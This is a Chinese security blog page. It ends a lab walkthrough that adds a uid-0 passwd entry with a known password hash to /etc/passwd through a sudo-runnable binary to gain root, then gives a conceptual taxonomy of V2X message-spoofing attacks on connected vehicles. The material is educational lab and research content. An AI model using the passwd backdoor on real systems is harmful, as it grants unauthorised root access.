-<p><code>vi /tmp/user</code> 先在tmp目錄下新增一個檔案叫user，並寫入以下內容</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">hful:$<span class="number">1</span>$salt$qJH7.N4xYta3aEG<span class="operator">/</span>dfqo<span class="operator">/</span><span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>::<span class="operator">/</span>root:<span class="operator">/</span>bin<span class="operator">/</span>bash</span><br></pre></td></tr></table></figure>
-
-<p>寫完後到執行.&#x2F;test的地方<code>/opt/devstuff/dist/test</code></p>
-<p><code>sudo ./test /tmp/user /etc/passwd</code> 並執行這命令</p>
-<p>然後cat &#x2F;etc&#x2F;passwd就會看到hful變成了允許的root身分(這裡我有寫錯內容所以才出來兩個)</p>
-<p><img src="/img/DC_Untitled_74.png" alt="Untitled"></p>
-<p>接下來到hful登入密碼是剛剛前面設定的password</p>
-<p><img src="/img/DC_Untitled_75.png" alt="Untitled"></p>
-<p>其他參考</p>
-<p><a target="_blank" rel="noopener" href="https://www.explainshell.com/explain?cmd=sudo+-l">explainshell.com - sudo -l</a></p>
-<hr>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-  
-    <article id="post-V2X_module" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2024/12/21/V2X_module/" class="article-date">
-  	<time datetime="2024-12-21T12:32:07.096Z" itemprop="datePublished">2024-12-21</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2024/12/21/V2X_module/">
-        V2X Information Security Attack Behaviors And Risk Definitions
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>安全界關注的一個問題是區分攻擊和真正的系統故障</p>
-<ul>
-<li>內部與外部：<ul>
-<li>內部攻擊者是經過驗證的網路成員，可以與其他成員進行通訊。</li>
-<li>外部攻擊者無法正確簽署她的訊息，這限制了攻擊的多樣性。<ul>
-<li>儘管如此，她還是可以竊聽 V2X 廣播通訊</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>惡意與理性：<ul>
-<li>惡意攻擊者不會從攻擊中尋求個人利益，而是旨在損害成員或網路功能。<ul>
-<li>可以採取任何手段，而不考慮相應的成本和後果。</li>
-</ul>
-</li>
-<li>理性攻擊者追求個人利益，因此在攻擊手段和攻擊目標方面更容易預測。</li>
-</ul>
-</li>
-<li>主動與被動：<ul>
-<li>主動攻擊者可以產生資料包或訊號來執行攻擊</li>
-<li>被動攻擊者僅竊聽通訊通道（即線或車載有線網路）</li>
-</ul>
-</li>
-<li>本地與擴展：<ul>
-<li>攻擊者的範圍可能受到限制，即使控制多個實體（車輛或基地台），這使它成為本地攻擊者。</li>
-<li>擴展攻擊者控制分散在網路中的多個實體，從而擴大了攻擊範圍。</li>
-</ul>
-</li>
-<li>直接與間接：<ul>
-<li>直接攻擊者直接到達其主要目標</li>
-<li>間接攻擊者則透過次要目標到達其主要目標</li>
-</ul>
-</li>
-</ul>
-<h3 id="Risk-ratings-and-criteria"><a href="#Risk-ratings-and-criteria" class="headerlink" title="Risk ratings and criteria"></a><strong>Risk ratings and criteria</strong></h3><p>使用三個因素來得出風險等級：可重複性、影響力和隱蔽性</p>
-<table>
-<thead>
-<tr>
-<th><strong>Criteria</strong></th>
-<th><strong>High</strong></th>
-<th><strong>Medium</strong></th>
-<th><strong>Low</strong></th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Reproducibility 再現性</td>
-<td>該攻擊很容易重現</td>
-<td>該攻擊是可重現的，但有一些限制</td>
-<td>由於其複雜性或營運成本，該攻擊很難重現。</td>
-</tr>
-<tr>
-<td>Impact 影響</td>
-<td>該攻擊會感染系統並可能導致災難性損壞（例如accident）</td>
-<td>該攻擊會感染系統並可能導致中等程度的損壞（例如交通擁堵）</td>
-<td>此攻擊對系統沒有影響，但可能造成輕微損害</td>
-</tr>
-<tr>
-<td>Stealthiness 隱密性</td>
-<td>某些應用程式發生未知攻擊</td>
-<td>此攻擊需要多個不當行為偵測器、訊息類型或要偵測的資料來源</td>
-<td>廣播訊息很容易解釋不當行為</td>
-</tr>
-</tbody></table>
-<p>故障是暫時的，但攻擊是持久的、故意的和明顯的</p>
-<p>攻擊被定義為傳輸的攻擊訊息，其唯一目的是破壞道路交通、目標車輛或 V2X 網路的正常流動</p>
-<h3 id="攻擊類型"><a href="#攻擊類型" class="headerlink" title="攻擊類型"></a>攻擊類型</h3><ul>
-<li><p>基於傳輸類型的攻擊</p>
-<ul>
-<li><p>Ghost node-based</p>
-<ul>
-<li>基於幽靈節點<ul>
-<li>攻擊者傳輸訊息以在 V2X 網路上建立虛假節點</li>
-<li>假節點用於發動攻擊並觸發不良行為</li>
-<li>攻擊者自己的訊息是在沒有攻擊的情況下傳輸的，也就是真實的訊息</li>
-<li>高 可重複性 - 因為攻擊者可以使用她想要的任何資訊來建立新訊息</li>
-<li>高 影響力  - 這種攻擊能夠透過精心設計一系列 BSM 來執行攻擊，從而造成高額傷害</li>
-<li>高 隱蔽性 - 該攻擊使用不同的BSM進行攻擊，攻擊者可以使用不同的憑證對訊息進行簽名</li>
-<li>每輛幽靈車輛都可以模仿合理的移動模式</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>Self-Telemetry changing</p>
-<ul>
-<li>攻擊者在傳輸的訊息中改變自己的kinematic information 訊息</li>
-<li>透過報告虛假的kinematic information ，攻擊旨在對應用程式或預測演算法產生負面影響</li>
-<li>高 可重複性 - 攻擊者可以控制訊息內容</li>
-<li>中 影響力 - 僅向原始運動場添加了一些擾動</li>
-<li>中 隱蔽性 - 攻擊對攻擊和良性訊息使用相同的證書，這將增加其在零星攻擊策略的情況下的可檢測性</li>
-</ul>
-</li>
-<li><p>Constant&#x2F;Constant Offset</p>
-<ul>
-<li>攻擊者要麼保持目標運動場的資料恆定，要麼不斷將其偏移一定值<ul>
-<li>攻擊者即使在現實中正在移動，也會傳輸相同的位置</li>
-<li>攻擊者將在實際位置值上添加恆定偏移</li>
-<li>高 可重複性 - 攻擊者可以控制訊息內容</li>
-<li>低 影響力 - 僅傳輸恆定值，這並不是單獨有效的技術<ul>
-<li>一旦偵測到靜態攻擊，就可以輕鬆報告和忽略</li>
-</ul>
-</li>
-<li>低 隱蔽性 - 容易被偵測為natural flow of traffic的異常</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>Random&#x2F;Random Offset</p>
-<ul>
-<li>攻擊者要麼持續傳輸目標運動場的隨機數據，要麼隨機偏移實際值</li>
-<li>攻擊者將傳輸隨機位置，無論其實際移動如何</li>
-<li>高 可重複性 - 攻擊者將在實際位置值上添加隨機偏移。由於攻擊者可以控制訊息內容</li>
-<li>低 隱蔽性 - 隨機改變值只會像雜訊一樣。噪音很容易被濾除</li>
-<li>低 影響力 - 它使用攻擊者的相同憑證來進行攻擊和良性訊息</li>
-<li>這些攻擊就像 V2X 系統中的噪音一樣，訊息之間沒有關聯</li>
-</ul>
-</li>
-<li><p>High</p>
-<ul>
-<li>攻擊者為目標運動場傳輸過高&#x2F;過大的值</li>
-<li>攻擊者傳輸的速度值高於道路車輛的最高速度（例如 455.3 km&#x2F;h [13]）</li>
-<li>高 可重複性 - 攻擊者可以控制訊息內容</li>
-<li>中 影響力 - 如果這種攻擊是在維度（即高維度車輛）上進行的，則攻擊不會產生很大的影響，因為車輛只會遠離此類車輛並謹慎接近。<ul>
-<li>如果發送的速度或加速度較高，接收車輛可能會將其視為可能的碰撞事件。</li>
-</ul>
-</li>
-<li>低 隱蔽性 - 這些值很容易被偵測為不可信，而且攻擊者需要很複雜才能維護不同欄位（例如位置、速度、加速度）之間的相關性</li>
-</ul>
-</li>
-<li><p>Low</p>
-<ul>
-<li>與「高」攻擊類型類似，攻擊者為目標運動場傳輸過低&#x2F;小的值</li>
-<li>此類攻擊的風險等級遵循與「高」攻擊類型完全相同的模式</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>基於所使用的kinematic 值的攻擊</p>
-<ul>
-<li>根據用於執行該攻擊的kinematic field 來開發各種類型的攻擊</li>
-<li>Position<ul>
-<li>攻擊者要么創建一個具有虛假位置的幽靈車輛，要么修改自己的位置以發起基於位置的攻擊。</li>
-<li>攻擊的風險等級主要取決於它們與Constant、Constant Offset、Random、Random Offset、High和Low攻擊類型的組合</li>
-<li>除了以上的攻擊類型<ul>
-<li>Targeted constant position<ul>
-<li>此攻擊可能導致車輛突然煞車並導致後方車輛追撞</li>
-<li>攻擊者選擇一個目標節點（在本例中是移動的車輛）並傳輸其前面的位置</li>
-<li>這種攻擊，可以考慮許多這樣的邊緣情況</li>
-<li>高 可重複性 - 攻擊者繼續傳輸相同的位置，直到目標超出通訊範圍<ul>
-<li>攻擊者需要足夠快的資源來瞄準車輛，以引起車輛的反應</li>
-</ul>
-</li>
-<li>中 影響力 - 這種攻擊在攻擊之前需要受害者的位置資料<ul>
-<li>如果攻擊者不考慮road curvature，則攻擊可能無法在彎曲的道路上起作用</li>
-<li>在交通密集的情況下，傳輸虛假車輛位置可能不可行，因為它可能與另一輛車的位置重疊</li>
-</ul>
-</li>
-<li>低 隱蔽性 - 一旦攻擊者發送攻擊訊息，受害者就可以識別並報告 BSM 聲稱的地方沒有車輛</li>
-</ul>
-</li>
-<li>Sudden appearance<ul>
-<li>攻擊者發送一條幽靈車輛訊息，其位置就在目標節點移動車輛的正前方</li>
-<li>中 可重複性 - 原因與constant position attack類似</li>
-<li>高 影響力 - 如果時機正確，這種攻擊可能會造成巨大破壞</li>
-<li>低 隱蔽性 - 在執行攻擊後，很明顯 BSM 聲稱的地方沒有任何車輛</li>
-<li>自動駕駛汽車的下意識反應可能會導致停車場和道路出現問題</li>
-</ul>
-</li>
-<li>Sudden disappearance<ul>
-<li>攻擊者停止傳輸，進入radio silence，從而擺脫其他節點所使用的任何追蹤機制</li>
-<li>高 可重複性 - 因為攻擊者可以完全控制隨時停止傳輸</li>
-<li>低 影響力 -  接收車輛只會停止跟踪該攻擊者，如果無法跟踪，則不會受到傷害</li>
-<li>高 隱蔽性 - 由於這種攻擊的性質</li>
-<li>車輛會停止傳輸 V2X 訊息。其他汽車的傳感器仍然可以看到它</li>
-</ul>
-</li>
-<li>Speed<ul>
-<li>攻擊者在傳輸 BSM 之前欺騙自己的速度</li>
-<li>所有速度攻擊都屬於恆定、恆定偏移、隨機、隨機偏移、高和低型別攻擊</li>
-<li>與速度相關的攻擊通常具有中等風險等級（低速攻擊除外）</li>
-<li>這種攻擊可能導致碰撞時間 (TTC) 和碰撞距離 (DTC) 值大於實際值<ul>
-<li>其他車輛會認為它們擁有更多是時候清理他們所佔的空間了</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>Acceleration<ul>
-<li>攻擊者在傳輸 BSM 之前欺騙自己的加速</li>
-<li>所有加速攻擊都屬於恆定、恆定偏移、隨機、隨機偏移、高和低型別攻擊</li>
-<li>使用加速的攻擊具有中度到高風險</li>
-<li>當與「低」型攻擊結合使用時，它們會變得高風險<ul>
-<li>它們可能導致 TTC 和 DTC 值大於實際值</li>
-<li>給人一種接收車輛有更多時間清理其佔用空間的感覺</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>Heading<ul>
-<li>攻擊者在傳輸 BSM 之前欺騙自己的Heading</li>
-<li>除了Constant、Constant Offset、Random、Random Offset、High 和Low 類型攻擊之外，還有以下攻擊，此類攻擊整體風險等級較低<ul>
-<li>Opposite heading<ul>
-<li>攻擊者傳輸與其真實航向相反的方向，即與真實航向相加 180 度</li>
-<li>高 可重複性 - 由於攻擊者完全控制訊息內容</li>
-<li>高 影響力 - 車輛可能會對這種攻擊做出反應並對交通造成連鎖反應</li>
-<li>高 隱蔽性 - 車輛處於倒車檔，偵測器可能會偵測到攻擊者的汽車以高於預期的速度向相反方向移動</li>
-<li>它可能會欺騙車輛，讓其認為攻擊者車輛正在向它駛來，並迫使其採取規避策略，從而在密集的交通條件下造成更多幹擾</li>
-</ul>
-</li>
-<li>Perpendicular heading<ul>
-<li>攻擊者將垂直方向傳送到其真實航向，即與真實航向相加&#x2F;減去 90 度</li>
-<li>高 可重複性 - 攻擊者完全控制訊息內容</li>
-<li>高 影響力 - 車輛可能會對這種攻擊做出反應並對交通造成連鎖反應</li>
-<li>中 隱蔽性 - 探測器可能認為汽車正在橫向移動以改變車道</li>
-<li>在攻擊者旁邊行駛的車輛可能會認為與攻擊者發生了碰撞</li>
-</ul>
-</li>
-<li>Rotating heading<ul>
-<li>攻擊者發送的訊息與先前發送的heading有一定的偏移量<ul>
-<li>time t&#x3D;0, heading h&#x3D;0, x&#x3D;10. Then at time t&#x3D;1, heading&#x3D;10; at t&#x3D;2, heading&#x3D;20</li>
-</ul>
-</li>
-<li>高 可重複性 - 車輛似乎繞著其軸線旋轉。由於攻擊者完全控制訊息的內容</li>
-<li>低 影響力 - 車輛在接近此類汽車之前可能會減速<ul>
-<li>即使其他汽車距離攻擊者更近，他們也可以透過車載感測器確認這種行為</li>
-</ul>
-</li>
-<li>低 隱蔽性 - 因為onboard perception systems很容易偵測到欺騙行為</li>
-<li>這種攻擊可以被視為車輛遇到了slippery surface</li>
-</ul>
-</li>
-<li>Yaw Rate<ul>
-<li>攻擊者在傳輸 BSM 之前欺騙自己的偏航率</li>
-<li>所有對偏航率的攻擊都屬於恆定、恆定偏移、隨機、隨機偏移、高和低型別攻擊</li>
-<li>儘管由於攻擊者能夠更改訊息內容，這些攻擊具有很高的可重複性</li>
-</ul>
-</li>
-<li>Heading and Yaw Rate<ul>
-<li>攻擊者在傳輸 BSM 之前欺騙自己的航向和偏航率</li>
-<li>攻擊者確保航向和偏航率相互匹配，以便更難以根據其中任何一個檢測異常</li>
-<li>所有對航向和偏航率的攻擊都屬於恆定、恆定偏移、隨機、隨機偏移、高和低類型攻擊。</li>
-<li>所有這些攻擊總體風險等級較低</li>
-<li>高 可重複性 - 儘管由於攻擊者完全控制訊息內容，僅heading和yaw-rate看起來更像是一個有缺陷的感測器，而不是惡意感測器</li>
-<li>中 隱蔽性 - 這些攻擊是顯而易見的，但感測器故障的可能性使它們具有一定的隱蔽性</li>
-</ul>
-</li>
-<li>Dimension<ul>
-<li>攻擊者在傳輸 BSM 之前欺騙自己的dimension</li>
-<li>所有維度攻擊都屬於恆定、恆定偏移、隨機、隨機偏移、高和低型別攻擊</li>
-<li>所有基於維度的攻擊總體上風險等級較低</li>
-<li>高 可重複性 - 攻擊者能夠更改訊息內容</li>
-<li>低 影響力 - 這些攻擊只會讓其他車輛意識到更大（就「高」攻擊而言）或更小的（就「低”攻擊而言）車輛，其他車輛可以輕鬆避開特別大的車輛</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>Attacks on V2X applications</p>
-<ul>
-<li>針對特定的 V2X 安全應用</li>
-<li>這些應用程式是根據 SAE J2945&#x2F;1 標準中的描述來實現的</li>
-<li>EEBL：下面列出的攻擊針對第 III 節中描述的 EEBL 應用程式<ul>
-<li>Fake EEBL w&#x2F;o stopping<ul>
-<li>攻擊者透過傳輸幽靈車輛的 BSM 來欺騙所有步驟以發出 EEBL 警告</li>
-<li>在假的 EEBL 事件發生後，幽靈車並沒有停下來。由於此攻擊直接影響 EEBL 應用程序</li>
-<li>高風險</li>
-</ul>
-</li>
-<li>Stop position after Fake EEBL<ul>
-<li>在這次攻擊中，幽靈車輛在假 EEBL 事件後停止</li>
-<li>由於這種攻擊比前一種攻擊有所改進</li>
-<li>高風險</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>IMA：下面列出的攻擊針對第 III 節中所述的 IMA 應用程式<ul>
-<li>Constant junction position<ul>
-<li>攻擊者不斷將其位置描述為位於路口</li>
-<li>在十字路口發送恆定位置大多數情況下會導致交通擁堵，但不會造成致命事故</li>
-<li>接近的車輛會透過 V2X 訊息意識到攻擊者的假車輛</li>
-<li>低風險</li>
-</ul>
-</li>
-<li>High Acceleration<ul>
-<li>攻擊者傳輸較高的加速度值以擾亂TTC 和DTC 計算</li>
-<li>使其他車輛認為攻擊者的車輛正在更快地接近交叉路口</li>
-<li>這可能導致其他車輛誤以為交叉路口即將被攻擊者抵達</li>
-<li>這種攻擊可能會導致 TTC 和 DTC 值小於實際值</li>
-<li>這次攻擊會清除路口，但不會造成事故</li>
-<li>與High Speed攻擊不同的是，這種攻擊可能會使其他車輛在不必要的情況下啟動緊急措施</li>
-<li>高加速度攻擊會影響其對於攻擊者車輛時間到達交叉路口的感知</li>
-<li>低風險</li>
-</ul>
-</li>
-<li>Low Acceleration<ul>
-<li>攻擊者傳輸較低的加速度值以乾擾TTC 和DTC 計算</li>
-<li>目的是讓其他車輛認為攻擊者比實際情況更晚接近十字路口</li>
-<li>使其他車輛誤以為攻擊者以較慢的速度加速接近交叉路口，可能導致其他車輛誤以為攻擊者將花費更長的時間才能達到交叉路口</li>
-<li>他們可能採取不適當的行動，導致交通混亂或交通事故</li>
-<li>可能導致其他車輛做出不正確的預測，進而導致事故發生</li>
-<li>這種攻擊可能會導致 TTC 和 DTC 值大於實際值</li>
-<li>高風險</li>
-</ul>
-</li>
-<li>High Speed<ul>
-<li>攻擊者傳輸較高的速度值以擾亂TTC 和DTC 計算</li>
-<li>其他車輛認為攻擊者的車輛正在以更快的速度接近，從而對交叉路口採取更謹慎的行動</li>
-<li>可能會導致 TTC 和 DTC 值小於實際值</li>
-<li>這次攻擊會清除路口，但不會造成潛在事故</li>
-<li>高速度攻擊主要影響其他車輛對於攻擊者車輛速度的感知</li>
-<li>中風險</li>
-</ul>
-</li>
-<li>Low Speed<ul>
-<li>攻擊者傳輸較低的速度值以乾擾TTC 和DTC 計算</li>
-<li>使其他車輛誤以為攻擊者以較慢的速度接近交叉路口</li>
-<li>導致其他車輛認為他們有更多時間通過交叉路口，在真實情況下可能沒有足夠的時間，導致致命事故的發生</li>
-<li>這種攻擊可能會導致 TTC 和 DTC 值大於實際值</li>
-<li>高風險</li>
-</ul>
-</li>
-<li>Position offset<ul>
-<li>攻擊者以恆定偏移傳送其位置</li>
-<li>對十字路口的任何類型的攻擊都可能是致命的</li>
-<li>十字路口通常被認為是最危險的地點</li>
-<li>高風險</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>Attacks based on mobility</p>
-<ul>
-<li>攻擊者在執行攻擊之前會創建合理的移動模式</li>
-<li>利用了接收車輛可以使用的路徑歷史來建立對發送者的信任</li>
-<li>Braking from communication range<ul>
-<li>攻擊者選擇一個目標節點</li>
-<li>根據position 和 location，攻擊者估計目標節點的通訊範圍</li>
-<li>攻擊者在目標估計通訊範圍的邊緣創建一輛幽靈車輛</li>
-<li>攻擊者透過更改幽靈車輛的位置訊息，在後續 BSM 上縮短幽靈車輛與目標節點之間的距離</li>
-<li>一旦幽靈車進入攻擊距離（即目標沒有太多時間運行dvanced safety detection algorithms的距離），幽靈車就會在目標前方煞車</li>
-<li>攻擊者試圖獲得鄰近實體的「信任」來發動攻擊</li>
-<li>攻擊者可以選擇執行任何其他類型的攻擊，而不僅僅是煞車</li>
-<li>高風險</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>Attacks based on channel</p>
-<ul>
-<li>針對的是radio frequency或網路協議，而不是某個目標節點</li>
-<li>Denial of service<ul>
-<li>攻擊者以遠高於標準規定的速率傳輸可疑的 BSM</li>
-<li>目的是堵塞通道，使其他節點無法使用網路進行通訊</li>
-<li>F2MD 定義了此攻擊的其他variants</li>
-<li>攻擊者只能堵塞本地通訊網絡</li>
-<li>中風險</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>Attacks selected randomly</p>
-<ul>
-<li>這些攻擊是透過以各種方式隨機選擇上述攻擊之一來發動的</li>
-<li>Randomly select attack per node<ul>
-<li>每次攻擊者開始與 V2X 網路互動時，它都會從上述全套攻擊中隨機選擇攻擊</li>
-<li>由於此攻擊從上述攻擊中選擇隨機攻擊，因此其評級很大程度上取決於所選攻擊</li>
-<li>中風險</li>
-</ul>
-</li>
-<li>Randomly select attack per node per message<ul>
-<li>攻擊者為傳輸的每個訊息隨機選擇一種攻擊</li>
-<li>這種攻擊主要會造成破壞</li>
-<li>此攻擊為每個訊息選擇不同的攻擊，因此偵測器將很難識別攻擊者是否使用特定攻擊或只是模糊測試</li>
-<li>當需要多個 BSM 來發動攻擊時，這些攻擊可能不起作用</li>
-<li>低風險</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>Attack Policies</p>
-<ul>
-<li>攻擊者選擇的傳輸攻擊訊息的過程</li>
-<li>提出兩種攻擊策略，即Persistent攻擊和Sporadic攻擊</li>
-<li>Persistent<ul>
-<li>攻擊者始終使用此策略傳輸攻擊訊息</li>
-<li>攻擊者變得更加明顯且針對性較差</li>
-</ul>
-</li>
-<li>Sporadic<ul>
-<li>攻擊者使用機率分佈隨機傳輸攻擊訊息來選擇何時進行攻擊</li>
-<li>攻擊者在不進行攻擊時傳輸真實訊息</li>
-<li>此策略使攻擊者更加隱蔽</li>
-</ul>
-</li>
-<li>VeReMi和F2MD僅採用Persistent attack strategy</li>
-<li>VASP 實施Persistent和 Sporadic攻擊策略</li>
-<li>顯著增加了攻擊字典，並涵蓋了更多的 BSM 領域</li>
-<li>實作了更複雜的攻擊策略來進一步測試不當行為偵測系統</li>
-</ul>
-<p>  <img src="/img/V2X_modu1.png" alt="Untitled">
-  </p>
-</li>
-<li><p>Attack Scenarios</p>
-<ul>
-<li>攻擊者可以使用上述定義的一種或多種攻擊來實現其攻擊目標<ul>
-<li><p>例如，攻擊者的目的是使附近受害者的車輛無法動彈。</p>
-</li>
-<li><p>為了實現這一目標，攻擊者可以使用以下幾種方法。</p>
-</li>
-<li><p>Ghost node-based attack - massive Sybil attack</p>
-<p>  <img src="/img/V2X_modu2.png" alt="Untitled"></p>
-<ul>
-<li>作為第一種方法，攻擊者可以創建幾輛幽靈車輛來造成交通擁堵的假象</li>
-<li>受害者的車輛將需要煞車</li>
-</ul>
-</li>
-<li><p>Self-Telemetry changing - position overlap</p>
-<p>  <img src="/img/V2X_modu3.png" alt="Untitled"></p>
-<ul>
-<li>作為第二種方法，攻擊者可以傳達其真實位置的偏移量以與目標車輛重疊</li>
-<li>因此，自動駕駛系統或目標車輛的受害者可能會認為發生了碰撞而煞車</li>
-<li>除了位置偏移之外，攻擊者還可以更改其類型以假裝是行人</li>
-<li>目標車輛的駕駛系統可能認為它碾壓了行人</li>
-</ul>
-</li>
-<li><p>Attack on V2X application - fake EEBL</p>
-<p>  <img src="/img/V2X_modu4.png" alt="Untitled"></p>
-<ul>
-<li>作為第三種方法，攻擊者可以傳輸包含 EEBL 警告的 V2X 訊息</li>
-<li>受害者的車輛將在收到包含 EEBL 警告的 V2X 訊息後煞車</li>
-<li>平台 VASP 提供了一系列廣泛的攻擊，可以衍生出多種攻擊場景</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
 
       
     </div>
